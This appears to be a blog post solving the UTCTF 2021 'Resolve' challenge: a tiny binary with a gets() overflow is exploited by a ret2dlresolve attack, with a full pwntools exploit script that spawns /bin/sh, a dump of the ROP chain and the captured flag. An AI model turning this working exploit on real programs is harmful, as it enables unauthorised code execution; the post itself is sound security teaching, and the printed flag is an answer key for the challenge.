---
layout: post
title: [UTCTF 2021] Resolve
author: Kevin Zhang
---

We are given a very barebones binary that looks like this:

```
int main(void)

{
  char local_10 [8];
  
  gets(local_10);
  return 0;
}

```
Now the vulnerability is a classic buffer overflow but the problem is that this is all there is in the binary. There isn't any libc addresses in the stack or in any of the registers when we return. Since we can't find an address leak that means we can't just find the address of `system()` and create a rop chain using that. After some digging I was able to find that the attack is called a ret2dlresolve. Here is a blog with more info about that: https://ypl.coffee/dl-resolve/  

Now what we could do is write a ret2dlresolve payload by hand such as the one [here]. No thanks. Fortunately, pwntools has a ret2dlsresolve module that will automatically generate the payloads for you. So our payload ends up being something like this:

```
from pwntools import *
context.binary = elf = ELF('resolve')
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

# Allows us to write to any location. We want to write to where the dlresolve payload will be
rop.gets(dlresolve.data_addr)

# RET gadget for stack alignment.
rop.raw(0x00401159) 

# The dlresolve payload
rop.ret2dlresolve(dlresolve)

# Put it together
raw_rop = rop.chain()

p = elf.process()

# First gets() to setup the rop chain to write to the correct address
p.sendline(fit({8+context.bytes: raw_rop})) 

# Second gets() to send the dlresolve payload.
p.sendline(dlresolve.payload) 
p.interactive()
```

The rop chain looks something like this:

```
0x0000:         0x4011c3 pop rdi; ret                                                                                   0x0008:         0x404e00 [arg0] rdi = 4214272                                                                           0x0010:         0x401044 gets                                                                                           0x0018:         0x401159                                                                                                0x0020:         0x4011c3 pop rdi; ret                                                                                   0x0028:         0x404e50 [arg0] rdi = 4214352                                                                           0x0030:         0x401020 [plt_init] system                                                                              0x0038:            0x310 [dlresolve index]
```

So just aim this at the server and ye shall receive the flag.  
`utflag{2_linker_problems_in_one_ctf?8079235}`  

It's pretty cool that we can still call libc functions without the use of address leaks. This exploit will definitely be something that I keep in mind for the future. Although it was really simple for this challenge due to no PIE which probably simplified where we could put the dlpayload.



[here]: (https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62)